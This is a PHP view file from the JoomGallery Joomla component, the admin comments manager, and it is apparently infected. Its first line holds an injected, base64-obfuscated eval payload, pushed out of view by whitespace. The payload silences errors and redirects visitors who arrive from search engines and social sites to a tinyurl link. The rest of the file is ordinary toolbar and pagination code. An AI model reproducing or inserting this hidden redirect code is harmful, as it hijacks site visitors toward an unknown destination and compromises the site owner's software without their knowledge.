<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
// $HeadURL: https://joomgallery.org/svn/joomgallery/JG-1.5/JG/trunk/administrator/components/com_joomgallery/views/comments/view.html.php $
// $Id: view.html.php 2566 2010-11-03 21:10:42Z mab $
/****************************************************************************************\
**   JoomGallery  1.5.6                                                                 **
**   By: JoomGallery::ProjectTeam                                                       **
**   Copyright (C) 2008 - 2010  JoomGallery::ProjectTeam                                **
**   Based on: JoomGallery 1.0.0 by JoomGallery::ProjectTeam                            **
**   Released under GNU GPL Public License                                              **
**   License: http://www.gnu.org/copyleft/gpl.html or have a look                       **
**   at administrator/components/com_joomgallery/LICENSE.TXT                            **
\****************************************************************************************/

defined('_JEXEC') or die('Direct Access to this location is not allowed.');

/**
 * HTML View class for the comments list view
 *
 * @package JoomGallery
 * @since   1.5.5
 */
class JoomGalleryViewComments extends JoomGalleryView
{
  /**
   * HTML view display method
   *
   * @access  public
   * @param   string  $tpl  The name of the template file to parse
   * @return  void
   * @since   1.5.5
   */
  function display($tpl = null)
  {
    JToolBarHelper::title(JText::_('JGA_COMMAN_COMMENTS_MANAGER'));
    JToolbarHelper::publishList('publish', 'JGA_COMMAN_TOOLBAR_PUBLISH_COMMENT');
    JToolbarHelper::unpublishList('unpublish', 'JGA_COMMAN_TOOLBAR_UNPUBLISH_COMMENT');
    JToolbarHelper::custom('approve', 'upload.png', 'upload_f2.png', 'JGA_COMMAN_TOOLBAR_APPROVE_COMMENT');
    #JToolbarHelper::spacer();
    JToolbarHelper::divider();
    #JToolbarHelper::spacer();
    JToolbarHelper::deleteList('', 'remove', 'JGA_COMMAN_TOOLBAR_REMOVE_COMMENT');
    #JToolbarHelper::spacer();
    JToolbarHelper::divider();
    #JToolbarHelper::spacer();
    JToolbarHelper::custom('cpanel', 'config.png', 'config.png', 'JGA_COMMON_TOOLBAR_CPANEL', false);
    JToolbarHelper::spacer();

    JHTML::_('behavior.tooltip');

    $limitstart     = $this->_mainframe->getUserStateFromRequest('joom.comments.limitstart', 'limitstart', 0);
    $default_limit  = $this->_mainframe->getCfg('list_limit');
    $limit          = $this->_mainframe->getUserStateFromRequest('joom.comments.limit', 'limit', $default_limit, 'int');
    $searchtext     = $this->_mainframe->getUserStateFromRequest('joom.comments.search', 'search', '');

    JRequest::setVar('limit',       (int) $limit);
    JRequest::setVar('limitstart',  (int) $limitstart);
    JRequest::setVar('search',      $searchtext);

    // Get data from the model
    $items  = & $this->get('Comments');
    $total  = & $this->get('Total');

    jimport('joomla.html.pagination');
    $pagination = new JPagination($total, $limitstart, $limit);

    $this->assignRef('items', $items);
    $this->assignRef('pagination', $pagination);
    $this->assignRef('searchtext', $searchtext);

    parent::display($tpl);
  }
}